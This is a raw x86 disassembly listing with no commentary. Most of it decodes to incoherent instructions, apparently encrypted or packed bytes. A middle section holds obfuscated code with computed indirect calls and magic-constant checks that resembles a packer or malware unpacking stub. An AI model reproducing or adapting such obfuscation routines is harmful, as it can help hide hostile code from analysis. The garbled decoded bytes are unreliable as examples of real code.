  40cd44:	push   edi
  40cd45:	sub    eax,0x3f048c68
  40cd4a:	push   edi
  40cd4b:	mov    ah,0x22
  40cd4d:	pop    eax
  40cd4e:	ins    DWORD PTR es:[edi],dx
  40cd4f:	stos   DWORD PTR es:[edi],eax
  40cd50:	stos   BYTE PTR es:[edi],al
  40cd51:	pop    ecx
  40cd52:	sahf   
  40cd53:	add    al,0x28
  40cd55:	ins    BYTE PTR es:[edi],dx
  40cd56:	jl     0x40cd8b
  40cd58:	fdivr  QWORD PTR [esi]
  40cd5a:	xor    eax,0x5be49f44
  40cd5f:	push   ebx
  40cd60:	pop    ebp
  40cd61:	out    0xc1,al
  40cd63:	push   edx
  40cd64:	repz repnz mov ecx,DWORD PTR [edx-0x4]
  40cd69:	shl    DWORD PTR [ebx+0x124b8634],cl
  40cd6f:	(bad)  [ebx-0x13505ae6]
  40cd75:	repz dec ecx
  40cd77:	xor    esp,DWORD PTR [esp+ebx*4]
  40cd7a:	push   ds
  40cd7b:	xor    eax,0x1e80aa25
  40cd80:	jne    0x40cdb3
  40cd82:	(bad)  
  40cd83:	or     al,0xd4
  40cd85:	pop    ds
  40cd86:	pop    edx
  40cd87:	ret    0x219e
  40cd8a:	push   es
  40cd8b:	gs aam 0xb0
  40cd8e:	imul   ebx,DWORD PTR [eax+0x20],0xeccb76b5
  40cd95:	rol    DWORD PTR [ebx+0x37cde5d8],0x93
  40cd9c:	push   edi
  40cd9d:	cld    
  40cd9e:	gs push 0xc
  40cda1:	loop   0x40cdc3
  40cda3:	pop    ecx
  40cda4:	mov    WORD PTR [edx+0x37a72070],ds
  40cdaa:	inc    esp
  40cdab:	mov    eax,0xa19ad6f1
  40cdb0:	fs push es
  40cdb2:	fcom   st(1)
  40cdb4:	iret   
  40cdb5:	sub    BYTE PTR [ebp+0x7a66e7ee],bh
  40cdbb:	test   BYTE PTR [ecx],dl
  40cdbd:	das    
  40cdbe:	cmp    eax,0x654652e5
  40cdc3:	jmp    0xb37e:0xde1d10e0
  40cdca:	imul   esi,esp,0x70cf1741
  40cdd0:	jo     0x40ce32
  40cdd2:	mov    ch,0x9b
  40cdd4:	push   cs
  40cdd5:	fcom   DWORD PTR [ebx-0x49]
  40cdd8:	sbb    BYTE PTR [ecx+ecx*1+0x73],0x7d
  40cddd:	or     DWORD PTR [eax-0x25b73f43],ecx
  40cde3:	dec    esi
  40cde4:	cmc    
  40cde5:	sub    al,0x56
  40cde7:	mov    ch,0x5d
  40cde9:	and    eax,0x6bc2e45d
  40cdee:	ins    DWORD PTR es:[edi],dx
  40cdef:	push   0x3c
  40cdf1:	jbe    0x40ce59
  40cdf3:	mov    dh,0x5
  40cdf5:	les    ebp,FWORD PTR [esi-0x7aa606c9]
  40cdfb:	rep ins DWORD PTR es:[edi],dx
  40cdfd:	jg     0x40cdbf
  40cdff:	cmp    al,0xff
  40ce01:	xchg   ebx,eax
  40ce02:	out    0xb4,eax
  40ce04:	rcl    al,1
  40ce06:	in     al,dx
  40ce07:	dec    eax
  40ce08:	dec    ebx
  40ce09:	xchg   BYTE PTR [esi],ah
  40ce0b:	xor    al,0x4a
  40ce0d:	adc    BYTE PTR [ecx-0x2339dfa2],dl
  40ce13:	loopne 0x40ce64
  40ce15:	in     al,0x46
  40ce17:	fld    TBYTE PTR [edx-0x37]
  40ce1a:	mov    ds:0xce07115,al
  40ce1f:	shl    ah,cl
  40ce21:	scas   eax,DWORD PTR es:[edi]
  40ce22:	mov    ebx,0x79d443f5
  40ce27:	add    cl,0x68
  40ce2a:	imul   ebp,DWORD PTR [ecx+0x3f],0x7a
  40ce2e:	ret    
  40ce2f:	ror    BYTE PTR [ebp+0x74e84b29],1
  40ce35:	arpl   ax,bp
  40ce37:	sbb    BYTE PTR [ebx+0x487f4f73],0x77
  40ce3e:	dec    esi
  40ce3f:	aaa    
  40ce40:	test   BYTE PTR [ecx],0x43
  40ce43:	and    cl,bl
  40ce45:	std    
  40ce46:	adc    eax,0x840fc83b
  40ce4b:	jno    0x40ce4d
  40ce4d:	add    BYTE PTR [eax],al
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c56
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42385a
  40cf91:	push   0x423812
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a76
  40cff7:	mov    ebx,DWORD PTR ds:0x421a9e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c56
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cda
  40d0ed:	mov    esi,DWORD PTR ds:0x421cd2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421cd2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	test   al,0x61
  40d113:	push   ebp
  40d114:	push   ecx
  40d115:	ret    0x62d1
  40d118:	(bad)  
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx+0x41]
  40d11e:	inc    esi
  40d11f:	mov    esp,0x784efba7
  40d124:	xor    al,0x9
  40d126:	dec    esi
  40d127:	mov    edx,DWORD PTR [edi]
  40d129:	adc    DWORD PTR [ecx],edi
  40d12b:	mov    ebx,0x43b302a2
  40d130:	(bad)
  40d133:	mov    ah,0x60
  40d135:	pop    ss
  40d136:	mov    ebx,0x5304f822
  40d13b:	jne    0x40d168
  40d13d:	push   cs
  40d13e:	in     al,0x18
  40d140:	mov    ebp,0xaa4a35f1
  40d145:	fdivr  QWORD PTR [ebp+0x538d5a]
  40d14b:	mov    ebp,0x44f1d240
  40d150:	add    ebp,edi
  40d152:	ds pop ss
  40d154:	push   es
  40d155:	pop    eax
  40d156:	dec    ecx
  40d157:	ret    
  40d158:	mov    esi,0x233f1021
  40d15d:	fisubr DWORD PTR [ecx-0x7176c989]
  40d163:	mov    eax,0xe47b8516
  40d168:	jl     0x40d122
  40d16a:	mov    edx,0x466f02f
  40d16f:	shl    DWORD PTR [edi+0x14],cl
  40d172:	dec    edx
  40d173:	mov    ah,0xce
  40d175:	clc    
  40d176:	xor    al,0x24
  40d178:	imul   ebp,DWORD PTR [ebx-0x6b],0x20a5a72b
  40d17f:	xor    al,0x8c
  40d181:	mov    edx,0xd41ee514
  40d186:	or     al,0x98
  40d188:	sbb    bl,BYTE PTR [eax]
  40d18a:	jp     0x40d12b
  40d18c:	push   ds
  40d18d:	fs push ds
  40d18f:	popa   
  40d190:	adc    eax,edi
  40d192:	or     eax,DWORD PTR [edx-0x6a]
  40d195:	xor    al,dl
  40d197:	add    al,0x35
  40d199:	aam    0xe4
  40d19b:	mov    bh,0x15
  40d19d:	push   edx
  40d19e:	mov    edx,0x46058ffe
  40d1a3:	outs   dx,BYTE PTR ds:[esi]
  40d1a4:	in     al,dx
  40d1a5:	jno    0x40d21f
  40d1a7:	mov    esp,0x8cdae21a
  40d1ac:	xor    ch,dh
  40d1ae:	jno    0x40d223
  40d1b0:	xlat   BYTE PTR ds:[ebx]
  40d1b1:	jg     0x40d16b
  40d1b3:	shl    DWORD PTR [ecx-0x28a6b2c2],1
  40d1b9:	xor    esi,ecx
  40d1bb:	shr    BYTE PTR [esi+ebx*1+0x59],cl
  40d1bf:	pop    eax
  40d1c0:	test   al,0x5e
  40d1c2:	mov    ecx,0x53224dc2
  40d1c7:	jle    0x40d228
  40d1c9:	pmulhuw mm1,QWORD PTR [edx]
  40d1cc:	ins    BYTE PTR es:[edi],dx
  40d1cd:	mov    edx,0x5c866db7
  40d1d2:	nop
  40d1d3:	test   DWORD PTR [edi-0x6b],esp
  40d1d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d7:	xchg   BYTE PTR cs:[eax+0x4dca5c58],dl
  40d1de:	add    DWORD PTR [ebp-0x76846a1e],ebx
  40d1e4:	push   ebx
  40d1e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1e6:	xchg   edi,eax
  40d1e7:	lahf   
  40d1e8:	dec    ebx
  40d1e9:	scas   eax,DWORD PTR es:[edi]
  40d1ea:	loopne 0x40d181
  40d1ec:	xor    eax,0x761429e4
  40d1f1:	inc    esp
  40d1f2:	dec    ebp
  40d1f3:	loopne 0x40d1e9
  40d1f5:	popf   
  40d1f6:	cs cmp eax,0x5b912bf8
  40d1fc:	(bad)  
  40d1fd:	push   ebx
  40d1fe:	or     dh,BYTE PTR [edx]
  40d200:	cmp    BYTE PTR [edi-0x1c1e3f4c],ah
  40d206:	inc    ecx
  40d207:	lea    ebp,[edx+ebp*1]
  40d20a:	add    BYTE PTR [edi+0x65],al
  40d20d:	inc    esi
  40d20e:	shl    DWORD PTR [esi+0x2d0bf348],cl
  40d214:	ror    BYTE PTR [edi-0x4a],0xb1
  40d218:	stos   BYTE PTR es:[edi],al
  40d219:	add    eax,DWORD PTR [ebx]
  40d21b:	jmp    DWORD PTR [ebx+ecx*8]
  40d21e:	mov    ch,0x51
  40d220:	popa   
  40d221:	mov    ds:0x14cbbb53,al
  40d226:	scas   eax,DWORD PTR es:[edi]
  40d227:	adc    DWORD PTR [ebp-0x47],ebx
  40d22a:	inc    eax
  40d22b:	xchg   edi,eax
  40d22c:	enter  0x714e,0x25
  40d230:	loop   0x40d1f0
  40d232:	fnstsw ax
  40d234:	sub    BYTE PTR ds:0x58a6600b,dh
  40d23a:	sub    BYTE PTR [ebx+0x4b],cl
  40d23d:	pop    edi
  40d23e:	stos   BYTE PTR es:[edi],al
  40d23f:	or     al,0x79
  40d241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d242:	push   es
  40d243:	xor    al,0xd
  40d245:	jb     0x40d2b2
  40d247:	leave  
  40d248:	or     BYTE PTR [esi+0x53ba55cd],al
  40d24e:	add    ecx,esp
  40d250:	das    
  40d251:	pop    ecx
  40d252:	push   ecx
  40d254:	pop    ebp
  40d255:	scas   eax,DWORD PTR es:[edi]
  40d256:	ficom  WORD PTR [edi+0x26be2840]
  40d25c:	mov    bh,0xdb
  40d25e:	xchg   BYTE PTR [esi],al
  40d260:	loop   0x40d202
  40d262:	jl     0x40d2b4
  40d264:	hlt    
  40d265:	int3   
  40d266:	jle    0x40d2d1
  40d268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d269:	jecxz  0x40d2cd
  40d26b:	lds    edx,FWORD PTR [ebp-0x52]
  40d26e:	dec    ebp
  40d26f:	scas   al,BYTE PTR es:[edi]
  40d270:	(bad)  [edi+esi*2+0x4baccc38]
  40d277:	push   ecx
  40d278:	add    BYTE PTR [edi+0x52784791],al
  40d27e:	mov    esp,0x2c59826
  40d283:	cdq    
  40d284:	add    ebx,DWORD PTR [eax-0x2b]
  40d287:	in     al,dx
  40d288:	data16 mov BYTE PTR [ecx-0x69],ah
  40d28c:	sub    eax,0x3657c29c
  40d291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d292:	jge    0x40d22b
  40d294:	xchg   esp,eax
  40d295:	jnp    0x40d233
  40d297:	(bad)  [ebx-0x4776e170]
  40d29d:	in     eax,dx
  40d29e:	jo     0x40d29e
  40d2a0:	mov    edi,0x54a79bd1
  40d2a5:	lds    edi,FWORD PTR [edx]
  40d2a7:	dec    esp
  40d2a8:	mov    edx,0xc88102ca
  40d2ae:	jmp    0x7097:0x1e418cf4
  40d2b5:	(bad)  
  40d2b6:	jge    0x40d32a
  40d2b8:	push   ebx
  40d2b9:	inc    edx
  40d2ba:	es (bad) 
  40d2bc:	push   esi
  40d2bd:	cwde   
  40d2be:	sub    dl,ah
  40d2c0:	push   ebp
  40d2c1:	jecxz  0x40d2e3
  40d2c3:	push   0xffffffe5
  40d2c5:	cmp    al,0x6e
  40d2c7:	jbe    0x40d29d
  40d2c9:	xchg   esi,eax
  40d2ca:	icebp  
  40d2cb:	addr16 pop ebp
  40d2cd:	jno    0x40d2f9
  40d2cf:	cmp    BYTE PTR [ecx+0x67],bl
  40d2d2:	repz loope 0x40d2b8
  40d2d5:	popa   
  40d2d6:	push   es
  40d2d7:	and    al,BYTE PTR [ecx+0x6d94abed]
  40d2dd:	push   eax
  40d2de:	mov    edi,0x16db19e9
  40d2e3:	and    BYTE PTR [ecx],cl
  40d2e5:	aas    
  40d2e6:	xor    al,0xe0
  40d2e8:	rol    BYTE PTR [eax],0x30
  40d2eb:	mov    cl,0xd4
  40d2ed:	fist   DWORD PTR [edi+ebp*8-0x3a819836]
  40d2f4:	mov    ch,0xff
  40d2f6:	dec    eax
  40d2f7:	popa   
  40d2f8:	call   0xbdd9e4bc
  40d2fd:	fnsave [esi+0x41b3aac1]
  40d303:	pop    edi
  40d304:	mov    esp,esi
  40d306:	ret    0xd698
  40d309:	mov    al,ds:0x90cab371
  40d30e:	jb     0x40d37a
  40d310:	fadd   DWORD PTR [ecx]
  40d312:	daa    
  40d313:	call   0xd8f5c57b
  40d318:	add    DWORD PTR [esi-0x1cf6284b],esp
  40d31e:	pop    es
  40d31f:	nop
  40d320:	mov    bh,0xbb
  40d322:	cmpxchg cl,bl
  40d325:	adc    al,0x9d
  40d327:	mov    esi,0xcb712d22
  40d32c:	push   0x16a532b1
  40d331:	in     eax,0x54
  40d333:	push   cs
  40d334:	lds    eax,FWORD PTR [ebp+0x2]
  40d337:	dec    esp
  40d338:	mov    ebp,0x7b986099
  40d33d:	adc    ebx,DWORD PTR gs:[ebx-0x40]
  40d341:	pop    edi
  40d342:	mov    bl,0xac
  40d344:	sbb    BYTE PTR [eax],ch
  40d346:	call   0x850d:0x87881474
  40d34d:	repz push esp
  40d34f:	push   ebx
  40d350:	mul    BYTE PTR [ebx+0x8]
  40d353:	daa    
  40d354:	inc    ebp
  40d355:	retf   
  40d356:	add    dl,ch
  40d358:	call   0x4fbc:0x922c7975
  40d35f:	push   esp
  40d360:	imul   edx,DWORD PTR [ecx-0x74],0xba71a107
  40d367:	ret    0x168
  40d36a:	lea    ecx,[eax]
  40d36c:	cwde   
  40d36d:	jae    0x40d3d8
  40d36f:	stos   DWORD PTR es:[edi],eax
  40d370:	xchg   DWORD PTR [ebx-0x54],esi
  40d373:	or     ah,0x62
  40d376:	gs stc 
  40d378:	fidiv  WORD PTR gs:[ecx+ecx*8]
  40d37c:	xor    BYTE PTR [ecx+ecx*8],0xb8
  40d380:	das    
  40d381:	das    
  40d382:	cdq    
  40d383:	sti    
  40d384:	rcl    DWORD PTR [esp+ebp*4-0x7d],cl
  40d388:	mov    ah,0xe5
  40d38a:	mov    ah,0xef
  40d38c:	mov    esi,0xed6f6440
  40d391:	dec    esp
  40d392:	adc    al,0xdd
  40d394:	mov    ch,0x29
  40d396:	test   BYTE PTR [edx+0x32],ch
  40d399:	pop    ecx
  40d39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d39b:	lods   eax,DWORD PTR ds:[esi]
  40d39c:	push   edx
  40d39d:	xchg   esi,eax
  40d39e:	lea    eax,[eax+0x11]
  40d3a1:	xchg   esi,eax
  40d3a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3a3:	mov    edx,0x85517a23
  40d3a8:	sub    ebp,0x9f66423f
  40d3ae:	out    dx,al
  40d3af:	cmc    
  40d3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3b1:	popa   
  40d3b2:	shl    BYTE PTR [ebx+eax*4],cl
  40d3b5:	mov    al,0xab
  40d3b7:	or     ebp,DWORD PTR cs:[edx+0x4abf6f3d]
  40d3be:	jne    0x40d35c
  40d3c0:	dec    esp
  40d3c1:	mov    dl,0x2b
  40d3c3:	pop    esi
  40d3c4:	shl    BYTE PTR [eax],1
  40d3c6:	push   0x9d4d61e0
  40d3cb:	xor    DWORD PTR [esi-0x15426d1e],esp
  40d3d1:	mov    esi,DWORD PTR ds:0xb419e1c1
  40d3d7:	xor    al,0x7b
  40d3d9:	(bad)  
  40d3da:	cld    
  40d3db:	cmp    al,0x49
  40d3dd:	and    eax,0xa94ac14c
  40d3e2:	push   es
  40d3e3:	fs das 
  40d3e5:	enter  0x53d5,0x50
  40d3e9:	clc    
  40d3ea:	scas   eax,DWORD PTR es:[edi]
  40d3eb:	(bad)  
  40d3ec:	fptan  
  40d3ee:	dec    ebx
  40d3ef:	xchg   ecx,eax
  40d3f0:	pop    ss
  40d3f1:	xor    esp,DWORD PTR [esi+0x2b]
  40d3f4:	scas   eax,DWORD PTR es:[edi]
  40d3f5:	inc    ecx
  40d3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f7:	addr16 pop edx
  40d3f9:	inc    eax
  40d3fa:	sub    BYTE PTR [eax],ch
  40d3fc:	jne    0x40d3be
  40d3fe:	jge    0x40d478
  40d400:	mov    edx,0x81b42753
  40d405:	mov    ch,0x87
  40d407:	mov    ecx,0x5fa42111
  40d40c:	sbb    bl,dh
  40d40e:	dec    ebp
  40d40f:	repz pop ds
  40d411:	in     eax,0xc6
  40d413:	es inc ebx
  40d415:	lds    esi,FWORD PTR [ecx-0x12]
  40d418:	sub    al,0x1b
  40d41a:	aad    0x3d
  40d41c:	daa    
  40d41d:	out    dx,al
  40d41e:	jmp    0x40d44d
  40d420:	adc    bl,BYTE PTR [ecx]
  40d422:	xchg   edx,eax
  40d423:	js     0x40d48d
  40d425:	inc    eax
  40d426:	mov    ds:0x68a43bb3,eax
  40d42b:	jns    0x40d44c
  40d42d:	hlt    
  40d42e:	fidiv  DWORD PTR [ecx+0xe80624a]
  40d434:	jno    0x40d49d
  40d436:	jno    0x40d4a0
  40d438:	ret    
  40d439:	jle    0x40d3f8
  40d43b:	ins    BYTE PTR es:[edi],dx
  40d43c:	scas   al,BYTE PTR es:[edi]
  40d43d:	std    
  40d43e:	pushf  
  40d43f:	xchg   edx,eax
  40d440:	std    
  40d441:	mov    eax,0xf4702990
  40d446:	jb     0x40d44d
  40d448:	bound  edi,QWORD PTR [edi]
  40d44a:	or     al,0x16
  40d44c:	inc    esp
  40d44d:	jp     0x40d433
  40d44f:	or     BYTE PTR [ebx+edi*2-0x324a078d],dl
  40d456:	push   esp
  40d457:	shl    DWORD PTR [edx],0x3
  40d45a:	mov    DWORD PTR [eax],edi
  40d45c:	and    ebp,DWORD PTR ds:0xefdf964a
  40d462:	inc    edx
  40d463:	fnsave [ebx+0x2a39469c]
  40d469:	and    BYTE PTR [edx],ah
  40d46b:	jle    0x40d4a6
  40d46d:	xor    dl,BYTE PTR [ebp-0x83a40da]
  40d473:	gs push ss
  40d475:	pop    ebx
  40d476:	call   0x7260b3e9
  40d47b:	icebp  
  40d47c:	add    BYTE PTR [ecx],bh
  40d47e:	jp     0x40d444
  40d480:	out    dx,al
  40d481:	add    ecx,DWORD PTR [edi]
  40d483:	xchg   esi,eax
  40d484:	jp     0x40d4dd
  40d486:	fs mov ecx,0xda413609
  40d48c:	js     0x40d4cc
  40d48e:	jp     0x40d436
  40d490:	add    BYTE PTR [eax-0xc],dh
  40d493:	xchg   ecx,eax
  40d494:	mov    ah,0xaf
  40d496:	mov    eax,ds:0x2856510
  40d49b:	push   ecx
  40d49c:	push   ebp
  40d49d:	mov    ebx,0xd1b4eea4
  40d4a2:	inc    esp
  40d4a3:	jmp    0xbf399d4c
  40d4a8:	ins    BYTE PTR es:[edi],dx
  40d4a9:	ss cmp ebx,eax
  40d4ac:	imul   ecx,DWORD PTR [edi],0x2bac5ec8
  40d4b2:	sbb    eax,0x621224ae
  40d4b7:	xchg   ebx,eax
  40d4b8:	jb     0x40d488
  40d4ba:	mov    dh,0xed
  40d4bc:	ret    
  40d4bd:	xor    edi,DWORD PTR [edx+0x13]
  40d4c0:	rcr    BYTE PTR [eax-0x50f2a9c],0x47
  40d4c7:	and    dh,BYTE PTR [eax]
  40d4c9:	sbb    eax,0x3cb94c56
  40d4ce:	addr16 push eax
  40d4d0:	jle    0x40d495
  40d4d2:	ins    DWORD PTR es:[edi],dx
  40d4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d4:	or     eax,0x631ebbf9
  40d4d9:	iret   
  40d4da:	rol    DWORD PTR [esi-0x3126e347],1
  40d4e0:	push   esp
  40d4e1:	sub    DWORD PTR [ebx+0xe00d2ef],ebp
  40d4e7:	or     edx,ebp
  40d4e9:	pandn  mm7,QWORD PTR [edx]
  40d4ec:	rol    bl,0xc8
  40d4ef:	aam    0xbc
  40d4f1:	je     0x40d4a2
  40d4f3:	adc    BYTE PTR [eax+0x21df2df],bh
  40d4f9:	(bad)  
  40d4fa:	fbld   TBYTE PTR [ecx]
  40d4fc:	and    DWORD PTR [edx-0x28],ebp
  40d4ff:	or     al,0x84
  40d501:	in     al,0x5c
  40d503:	cdq    
  40d504:	mov    al,0xda
  40d506:	ins    DWORD PTR es:[edi],dx
  40d507:	jl     0x40d4b8
  40d509:	stc    
  40d50a:	loopne 0x40d527
  40d50c:	in     eax,0x7a
  40d50e:	(bad)  [esi+0x6c]
  40d511:	sub    edx,esp
  40d513:	(bad)  
  40d514:	sub    eax,0xa64e9cbf
  40d519:	push   eax
  40d51a:	(bad)  
  40d51c:	daa    
  40d51d:	and    ecx,DWORD PTR [esi+edx*8+0x1a208c83]
  40d524:	(bad)  
  40d525:	out    dx,eax
  40d526:	pop    ebp
  40d527:	sbb    dh,BYTE PTR [eax+edi*1+0x37]
  40d52b:	enter  0x67a4,0x77
  40d52f:	xlat   BYTE PTR ds:[ebx]
  40d530:	sub    DWORD PTR [ecx],ebx
  40d532:	or     al,0xe6
  40d534:	sahf   
  40d535:	add    DWORD PTR [esi-0x4e],ecx
  40d538:	sbb    esp,DWORD PTR [ebx+0x14]
  40d53b:	or     BYTE PTR [ecx],dl
  40d53d:	lock test al,0x53
  40d540:	rol    DWORD PTR [esp+edx*4],1
  40d543:	adc    BYTE PTR [edx-0x2a],bl
  40d546:	dec    eax
  40d547:	mov    al,0x90
  40d549:	clc    
  40d54a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d54b:	popa   
